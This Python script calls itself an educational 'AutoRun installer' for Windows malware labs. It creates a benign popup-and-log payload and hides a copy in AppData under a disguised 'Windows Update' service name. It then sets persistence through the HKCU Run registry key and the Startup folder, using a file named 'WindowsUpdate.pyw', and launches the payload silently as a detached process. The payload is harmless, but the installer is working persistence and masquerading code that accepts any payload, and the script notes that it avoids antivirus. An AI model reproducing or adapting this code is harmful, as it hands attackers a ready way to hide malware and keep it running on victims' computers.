"""
AutoRun Installer - Educational Version
Uses Python scripts (.pyw) for reliable testing without AV issues.
"""

import os
import sys
import winreg
import shutil
import subprocess

# ==================== CONFIGURATION ====================
MALWARE_NAME = "EducationalAutoRunTest"
PAYLOAD_SOURCE = "C:\\MalwareLab\\helloWorld.pyw"
PAYLOAD_HIDDEN = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Update", "service.pyw")

# ==================== HELPER FUNCTIONS ====================

def get_pythonw_path():
    """Get pythonw.exe path (works for both .py and .exe execution)."""
    
    # Method 1: Check if running as compiled EXE
    if getattr(sys, 'frozen', False):
        # Running as compiled EXE - need to find Python installation
        possible_paths = [
            # Common Python installation paths
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "Python", "Python311", "pythonw.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "Python", "Python310", "pythonw.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "Python", "Python39", "pythonw.exe"),
            os.path.join(os.environ.get("LOCALAPPDATA", ""), "Programs", "Python", "Python312", "pythonw.exe"),
            # System-wide installation
            "C:\\Python311\\pythonw.exe",
            "C:\\Python310\\pythonw.exe",
            "C:\\Python39\\pythonw.exe",
            "C:\\Python312\\pythonw.exe",
            # Try PATH
            shutil.which("pythonw.exe"),
            shutil.which("pythonw"),
        ]
        
        for path in possible_paths:
            if path and os.path.exists(path):
                return path
        
        # Fallback: try to find via registry
        try:
            import winreg
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Python\PythonCore", 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY)
            subkey_count = winreg.QueryInfoKey(key)[0]
            for i in range(subkey_count):
                version = winreg.EnumKey(key, i)
                install_key = winreg.OpenKey(key, f"{version}\\InstallPath")
                install_path, _ = winreg.QueryValueEx(install_key, "")
                pythonw_path = os.path.join(install_path, "pythonw.exe")
                if os.path.exists(pythonw_path):
                    winreg.CloseKey(install_key)
                    winreg.CloseKey(key)
                    return pythonw_path
                winreg.CloseKey(install_key)
            winreg.CloseKey(key)
        except:
            pass
        
        # Last resort: assume it's in PATH
        return "pythonw.exe"
    
    else:
        # Running as Python script - use sys.executable
        python_exe = sys.executable
        pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
        if os.path.exists(pythonw_exe):
            return pythonw_exe
        return python_exe

def get_startup_folder():
    """Get Windows Startup folder path."""
    return os.path.join(
        os.environ["APPDATA"],
        r"Microsoft\Windows\Start Menu\Programs\Startup"
    )

def create_payload_if_missing():
    """Create the test payload if it doesn't exist."""
    if os.path.exists(PAYLOAD_SOURCE):
        return True
    
    os.makedirs(os.path.dirname(PAYLOAD_SOURCE), exist_ok=True)
    
    payload_code = '''
import tkinter as tk
from tkinter import messagebox
import datetime
import os

def main():
    os.makedirs("C:\\\\MalwareLab", exist_ok=True)
    
    log_file = "C:\\\\MalwareLab\\\\malware_log.txt"
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open(log_file, "a") as f:
        f.write(f"[{timestamp}] HelloWorld executed!\\n")
    
    root = tk.Tk()
    root.withdraw()
    
    messagebox.showinfo(
        "Educational Test",
        f"AutoRun Test Successful!\\n\\n"
        f"Time: {timestamp}\\n\\n"
        f"Log: C:\\\\MalwareLab\\\\malware_log.txt"
    )
    
    root.destroy()

if __name__ == "__main__":
    main()
'''
    
    with open(PAYLOAD_SOURCE, "w") as f:
        f.write(payload_code)
    
    print(f"[+] Created payload: {PAYLOAD_SOURCE}")
    return True

def hide_payload():
    """Copy payload to hidden location."""
    try:
        hidden_folder = os.path.dirname(PAYLOAD_HIDDEN)
        os.makedirs(hidden_folder, exist_ok=True)
        
        shutil.copy(PAYLOAD_SOURCE, PAYLOAD_HIDDEN)
        print(f"[+] Copied to: {PAYLOAD_HIDDEN}")
        return True
        
    except Exception as e:
        print(f"[-] Failed: {e}")
        return False

# ==================== PERSISTENCE METHODS ====================

def install_registry_persistence():
    """Add to Windows Registry Run key."""
    try:
        pythonw = get_pythonw_path()
        run_command = f'"{pythonw}" "{PAYLOAD_HIDDEN}"'
        
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )
        
        winreg.SetValueEx(key, MALWARE_NAME, 0, winreg.REG_SZ, run_command)
        winreg.CloseKey(key)
        
        print(f"[+] Registry persistence installed!")
        print(f"    Name: {MALWARE_NAME}")
        print(f"    Command: {run_command}")
        return True
        
    except Exception as e:
        print(f"[-] Registry failed: {e}")
        return False

def install_startup_folder_persistence():
    """Copy to Startup folder."""
    try:
        startup_folder = get_startup_folder()
        destination = os.path.join(startup_folder, "WindowsUpdate.pyw")
        
        shutil.copy(PAYLOAD_SOURCE, destination)
        print(f"[+] Startup folder persistence installed!")
        print(f"    Location: {destination}")
        return True
        
    except Exception as e:
        print(f"[-] Startup folder failed: {e}")
        return False

# ==================== EXECUTE PAYLOAD ====================

def execute_payload():
    """Run the payload immediately."""
    try:
        pythonw = get_pythonw_path()
        
        if os.path.exists(PAYLOAD_HIDDEN):
            target = PAYLOAD_HIDDEN
        else:
            target = PAYLOAD_SOURCE
        
        print(f"[+] Using Python: {pythonw}")
        print(f"[+] Executing: {target}")
        
        # Check if pythonw exists
        if not os.path.exists(pythonw) and pythonw != "pythonw.exe":
            print(f"[-] Warning: pythonw.exe not found at {pythonw}")
            print(f"[+] Trying system PATH...")
            pythonw = "pythonw.exe"
        
        subprocess.Popen(
            [pythonw, target],
            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
        )
        
        print(f"[+] Executed successfully!")
        return True
        
    except Exception as e:
        print(f"[-] Execution failed: {e}")
        return False

# ==================== MAIN ====================

def install_all_persistence():
    """Install all persistence methods and execute."""
    
    print()
    print("=" * 60)
    print("    AUTORUN INSTALLER - Educational Version")
    print("    Uses .pyw scripts (no antivirus issues)")
    print("=" * 60)
    print()
    
    # Show execution mode
    if getattr(sys, 'frozen', False):
        print("[*] Running as: Compiled EXE")
    else:
        print("[*] Running as: Python Script")
    
    pythonw = get_pythonw_path()
    print(f"[*] Python path: {pythonw}")
    print()
    
    # Create payload if missing
    print("[0/4] Checking payload...")
    if not create_payload_if_missing():
        print("[-] Failed to create payload")
        input("Press Enter to exit...")
        return
    
    print(f"[+] Payload ready: {PAYLOAD_SOURCE}")
    print()
    
    results = {
        "hide": False,
        "registry": False,
        "startup_folder": False,
        "execute": False
    }
    
    # Step 1: Hide payload
    print("[1/4] Hiding payload in AppData...")
    results["hide"] = hide_payload()
    print()
    
    # Step 2: Registry persistence
    print("[2/4] Installing Registry persistence...")
    results["registry"] = install_registry_persistence()
    print()
    
    # Step 3: Startup folder persistence
    print("[3/4] Installing Startup Folder persistence...")
    results["startup_folder"] = install_startup_folder_persistence()
    print()
    
    # Step 4: Execute immediately
    print("[4/4] Executing payload NOW...")
    results["execute"] = execute_payload()
    print()
    
    # Summary
    success_count = sum(1 for v in results.values() if v)
    
    print("=" * 60)
    print("    INSTALLATION COMPLETE")
    print("=" * 60)
    print(f"  Hide Payload:    {'✓ SUCCESS' if results['hide'] else '✗ FAILED'}")
    print(f"  Registry:        {'✓ SUCCESS' if results['registry'] else '✗ FAILED'}")
    print(f"  Startup Folder:  {'✓ SUCCESS' if results['startup_folder'] else '✗ FAILED'}")
    print(f"  Immediate Exec:  {'✓ EXECUTED' if results['execute'] else '✗ FAILED'}")
    print("=" * 60)
    print(f"  Total: {success_count}/4 successful")
    print("=" * 60)
    print()
    print("  NEXT STEPS:")
    print("  1. Popup should appear NOW")
    print("  2. Restart computer to test auto-run")
    print("  3. Check C:\\MalwareLab\\malware_log.txt")
    print("=" * 60)
    print()
    
    input("Press Enter to exit...")


if __name__ == "__main__":
    install_all_persistence()